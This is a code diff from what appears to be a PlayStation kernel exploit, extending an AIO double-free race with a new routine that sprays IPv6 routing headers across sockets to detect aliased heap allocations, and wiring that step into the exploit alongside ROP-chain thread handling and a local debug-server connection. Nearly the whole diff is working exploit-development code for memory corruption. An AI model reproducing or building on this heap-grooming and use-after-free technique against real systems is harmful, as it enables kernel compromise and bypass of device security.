@@ -149,7 +149,7 @@ void setup()
     );
     printf_debug("AIO test submitted with ID: %d\n", setup_data.test_id);
 
-    read_errno(); // Reset errno
+    reset_errno(); // Reset errno
     aio_multi_wait(
         &setup_data.test_id,
         1,
@@ -190,6 +190,65 @@ void setup()
 
     end:
         printf_debug("* errno value %d\n", read_errno());
+}
+
+#define NUM_ALIAS 100
+#define MARKER_OFFSET 4
+
+struct in6_addr
+{
+    uint8_t s6_addr[16];
+};
+
+template <size_t size>
+struct ip6_rthdr
+{
+    static constexpr uint8_t len = ((size >> 3) - 1) & ~1;
+    static constexpr uint8_t segleft = len >> 1;
+    static constexpr uint8_t used_size = (len + 1) << 3;
+    static constexpr uint8_t pad = size - used_size;
+    uint8_t  ip6r_nxt = 0;
+    uint8_t  ip6r_len = len;
+    uint8_t  ip6r_type = 0;
+    uint8_t  ip6r_segleft = segleft;
+    uint32_t ip6r_reserved = 0;
+    in6_addr ip6r_sigs[segleft] = {0};
+    uint8_t  _pad[pad] = {0};
+};
+
+int32_t aliased_rthdrs_sds[2] = {0};
+
+int32_t make_aliased_rthdrs()
+{
+    int32_t *sds = setup_data.sds;
+    ip6_rthdr<0x80> rthdr;
+    ip6_rthdr<0x80> rthdr2;
+
+    for (int32_t loop = 0; loop < NUM_ALIAS; loop++) {
+        for (int32_t i = 0; i < NUM_SDS; i++) {
+            if (sds[i] < 0) continue; // Skip invalid sockets
+            rthdr.ip6r_reserved = i; // Set a unique marker for each rthdr
+            set_rthdr(sds[i], &rthdr, rthdr.used_size);
+        }
+
+        for (int32_t i = 0; i < NUM_SDS; i++) {
+            if (sds[i] < 0) continue; // Skip invalid sockets
+            socklen_t len = rthdr.used_size;
+            if (get_rthdr(sds[i], &rthdr2, &len) != 0) continue;
+            if (rthdr2.ip6r_reserved == i) continue;
+            printf_debug("Aliased rthdrs found at attempt: %d\n", loop);
+            aliased_rthdrs_sds[0] = sds[i];
+            aliased_rthdrs_sds[1] = sds[rthdr2.ip6r_reserved];
+            printf_debug("aliased_rthdrs_sds: %d %d\n",
+                aliased_rthdrs_sds[0], aliased_rthdrs_sds[1]);
+            sds[i] = -1;
+            sds[rthdr2.ip6r_reserved] = -1;
+            free_rthdrs(sds, NUM_SDS);
+            return 0;
+        }
+    }
+    printf_debug("Failed to make aliased rthdrs!\n");
+    return -1;
 }
 
 #define NUM_REQS 3
@@ -270,7 +329,7 @@ int32_t race_one(
         printf_debug("Failed to execute thread's ROP chain!\n");
         return -1;
     }
-    uint64_t thread_id = (uint32_t)PS::Breakout::readMemoryU64(thread);
+    uint64_t thread_id = DEREF(thread);
     printf_debug("Thread spawned! ID: %ld\n", thread_id);
 
     // Pthread barrier implementation:
@@ -384,8 +443,7 @@ int32_t race_one(
         }
         // RESTORE: double freed memory has been reclaimed with harmless data
         // PANIC: 0x80 malloc zone pointers aliased
-        // return make_aliased_rthdrs(sds);
-        return 0;
+        return make_aliased_rthdrs();
     }
 
     return -1;
@@ -481,7 +539,7 @@ void main()
     PS::Breakout::init();
 
     // Attempt to connect to debug server
-    PS::Debug.connect(IP(192, 168, 1, 35), 9023);
+    PS::Debug.connect(IP(192, 168, 1, 37), 9023);
 
     // HELLO EVERYNYAN!
     Okage::printf("HELL%d\nEVERYNYAN!\n", 0);
